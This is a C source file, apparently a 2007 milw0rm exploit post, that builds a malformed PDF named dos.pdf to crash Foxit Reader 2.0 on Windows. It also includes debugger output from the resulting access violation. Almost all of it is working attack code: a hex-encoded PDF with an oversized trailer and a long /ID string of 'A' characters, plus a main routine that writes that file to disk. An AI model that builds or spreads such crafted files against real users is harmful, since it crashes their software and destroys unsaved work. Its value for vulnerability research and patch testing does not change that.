/**
*Created Friday, April 20 2007
*
*Moderator of http://igniteds.net
*
*Foxit Reader 2.0 for Windows Remote dos exploit created by n00b
*Foxit pdf viewer is prone to a dos exploit
*by opening a malformed pdf document it is possible
*to crash foxit reader which could cause the vic to
*lose any unsaved data..The vender has been notified
*Vendors web site http://www.foxitsoftware.com.
*It is possible to crash the foxit reader via opera
*or Internet exploer upon opening the pdf file to view
*online.
*Tested on : windows xp service packs 1 and 2
*linux version not tested.
*
*Shouts to every one at milw0rm and IG.
*Credits go to n00b for finding this vulnerability.
*
*To compile use dev-c ++
*
*  ..Debug info..
*************************************************************************
*****************
*(7e90.7e94): Access violation - code c0000005 (first chance)
*First chance exceptions are reported before any exception handling.
*This exception may be expected and handled.
*eax=00000000 ebx=5d8a0000 ecx=1d89fff0 edx=7627ffc0 esi=00f9ac2c edi=00000040
*eip=0049b291 esp=0012f614 ebp=5d8a0000 iopl=0         nv up ei pl nz ac pe nc
*cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000 efl=00010216
**** ERROR: Module load completed but symbols could not be loaded for
C:\Program Files\Foxit Reader.exe
*Foxit_Reader+0x9b291:
*0049b291 f3ab            rep stos dword ptr es:[edi] es:0023:00000040=????????
*************************************************************************
********************************
**/



#include <windows.h>
#include <stdio.h>
#include <conio.h>

#define PDF "dos.pdf"
#define Credits_to "n00b"

char evil_code[] =
"\x25\x50\x44\x46\x2d\x31\x2e\x33\x0d\x0a\x25\xe2\xe3\xcf\xd3\x0d"
"\x0a\x31\x34\x20\x30\x20\x6f\x62\x6a\x0d\x0a\x3c\x3c\x20\x0d\x0a"
"\x2f\x4c\x69\x6e\x65\x61\x72\x69\x7a\x65\x64\x20\x31\x20\x0d\x0a"
"\x2f\x4f\x20\x31\x37\x20\x0d\x0a\x2f\x48\x20\x5b\x20\x39\x31\x31"
"\x20\x31\x37\x37\x20\x5d\x20\x0d\x0a\x2f\x4c\x20\x33\x39\x37\x38"
"\x20\x0d\x0a\x2f\x45\x20\x32\x36\x37\x32\x20\x0d\x0a\x2f\x4e\x20"
"\x31\x20\x0d\x0a\x2f\x54\x20\x33\x35\x38\x30\x20\x0d\x0a\x3e\x3e"
"\x20\x0d\x0a\x65\x6e\x64\x6f\x62\x6a\x0d\x0a\x20\x20\x20\x20\x20"
"\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
"\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
"\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
"\x20\x20\x20\x20\x20\x20\x20\x20\x20\x78\x72\x65\x66\x0d\x0a\x31"
"\x34\x20\x31\x38\x20\x0d\x0a\x30\x30\x30\x30\x30\x30\x30\x30\x31"
"\x36\x20\x30\x30\x30\x30\x30\x20\x6e\x0d\x0a\x30\x30\x30\x30\x30"
"\x30\x30\x37\x30\x36\x20\x30\x30\x30\x30\x30\x20\x6e\x0d\x0a\x30"
"\x30\x30\x30\x30\x30\x30\x38\x36\x30\x20\x30\x30\x30\x30\x30\x20"
"\x6e\x0d\x0a\x30\x30\x30\x30\x30\x30\x31\x30\x38\x38\x20\x30\x30"
"\x30\x30\x30\x20\x6e\x0d\x0a\x30\x30\x30\x30\x30\x30\x31\x33\x32"
"\x39\x20\x30\x30\x30\x30\x30\x20\x6e\x0d\x0a\x30\x30\x30\x30\x30"
"\x30\x31\x34\x30\x39\x20\x30\x30\x30\x30\x30\x20\x6e\x0d\x0a\x30"
"\x30\x30\x30\x30\x30\x31\x35\x30\x38\x20\x30\x30\x30\x30\x30\x20"
"\x6e\x0d\x0a\x30\x30\x30\x30\x30\x30\x31\x36\x31\x34\x20\x30\x30"
"\x30\x30\x30\x20\x6e\x0d\x0a\x30\x30\x30\x30\x30\x30\x31\x37\x30"
"\x39\x20\x30\x30\x30\x30\x30\x20\x6e\x0d\x0a\x30\x30\x30\x30\x30"
"\x30\x31\x38\x30\x39\x20\x30\x30\x30\x30\x30\x20\x6e\x0d\x0a\x30"
"\x30\x30\x30\x30\x30\x31\x38\x35\x33\x20\x30\x30\x30\x30\x30\x20"
"\x6e\x0d\x0a\x30\x30\x30\x30\x30\x30\x31\x38\x38\x32\x20\x30\x30"
"\x30\x30\x30\x20\x6e\x0d\x0a\x30\x30\x30\x30\x30\x30\x32\x33\x34"
"\x30\x20\x30\x30\x30\x30\x30\x20\x6e\x0d\x0a\x30\x30\x30\x30\x30"
"\x30\x32\x34\x34\x36\x20\x30\x30\x30\x30\x30\x20\x6e\x0d\x0a\x30"
"\x30\x30\x30\x30\x30\x32\x34\x36\x37\x20\x30\x30\x30\x30\x30\x20"
"\x6e\x0d\x0a\x30\x30\x30\x30\x30\x30\x32\x35\x37\x31\x20\x30\x30"
"\x30\x30\x30\x20\x6e\x0d\x0a\x30\x30\x30\x30\x30\x30\x30\x39\x31"
"\x31\x20\x30\x30\x30\x30\x30\x20\x6e\x0d\x0a\x30\x30\x30\x30\x30"
"\x30\x31\x30\x36\x38\x20\x30\x30\x30\x30\x30\x20\x6e\x0d\x0a\x74"
"\x72\x61\x69\x6c\x65\x72\x0d\x0a\x3c\x3c\x0d\x0a\x2f\x53\x69\x7a"
"\x65\x20\x39\x39\x39\x39\x39\x0d\x0a\x2f\x49\x6e\x66\x6f\x20\x32"
"\x20\x30\x20\x52\x20\x0d\x0a\x2f\x52\x6f\x6f\x74\x20\x31\x35\x20"
"\x30\x20\x52\x20\x0d\x0a\x2f\x50\x72\x65\x76\x20\x33\x35\x37\x30"
"\x20\x0d\x0a\x2f\x49\x44\x5b\x3c\x41\x41\x41\x41\x41\x41\x41\x41"
"\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
"\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
"\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
"\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
"\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
"\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
"\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
"\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
"\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
"\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
"\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
"\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
"\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
"\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
"\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
"\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
"\x41\x41\x41\x41\x41\x41\x3e\x5d\x0d\x0a\x3e\x3e\x0d\x0a\x73\x74"
"\x61\x72\x74\x78\x72\x65\x66\x0d\x0a\x30\x0d\x0a\x25\x25\x45\x4f"
"\x46\x0d\x0a\x20\x20\x20\x20\x20\x20\x0d\x0a\x31\x35\x20\x30\x20"
"\x6f\x62\x6a\x0d\x0a\x3c\x3c\x20\x0d\x0a\x2f\x54\x79\x70\x65\x20"
"\x2f\x43\x61\x74\x61\x6c\x6f\x67\x20\x0d\x0a\x2f\x50\x61\x67\x65"
"\x73\x20\x31\x20\x30\x20\x52\x20\x0d\x0a\x2f\x53\x74\x72\x75\x63"
"\x74\x54\x72\x65\x65\x52\x6f\x6f\x74\x20\x32\x32\x20\x30\x20\x52"
"\x20\x0d\x0a\x2f\x53\x70\x69\x64\x65\x72\x49\x6e\x66\x6f\x20\x33"
"\x20\x30\x20\x52\x20\x0d\x0a\x2f\x4e\x61\x6d\x65\x73\x20\x31\x36"
"\x20\x30\x20\x52\x20\x0d\x0a\x2f\x4f\x75\x74\x6c\x69\x6e\x65\x73"
"\x20\x31\x38\x20\x30\x20\x52\x20\x0d\x0a\x2f\x50\x61\x67\x65\x4d"
"\x6f\x64\x65\x20\x2f\x55\x73\x65\x4f\x75\x74\x6c\x69\x6e\x65\x73"
"\x20\x0d\x0a\x3e\x3e\x20\x0d\x0a\x65\x6e\x64\x6f\x62\x6a\x0d\x0a"
"\x39\x39\x39\x39\x39\x39\x39\x39\x39\x39\x39\x39\x39\x39\x39\x39"
"\x39\x20\x30\x20\x6f\x62\x6a\x0d\x0a\x3c\x3c\x20\x0d\x0a\x0d\x0a"
"\x31\x37\x33\x0d\x0a\x25\x25\x45\x4f\x46\x0d\x0a";



int main() {

FILE *File;

int i = 0;

    if((File=fopen(PDF,"wb")) == NULL)  {
               printf("fuck We are Unable to build the file %s", PDF);
               exit(0);
       }

    printf("Creating pdf File please wait\n");

    for(i=0;i<sizeof(evil_code)-1;i++)
               fputc(evil_code[i],File);

    fclose(File);
    printf("pdf file %s successfully created hoooha..\n", PDF);
        return 0;
}

# milw0rm.com [2007-04-20]
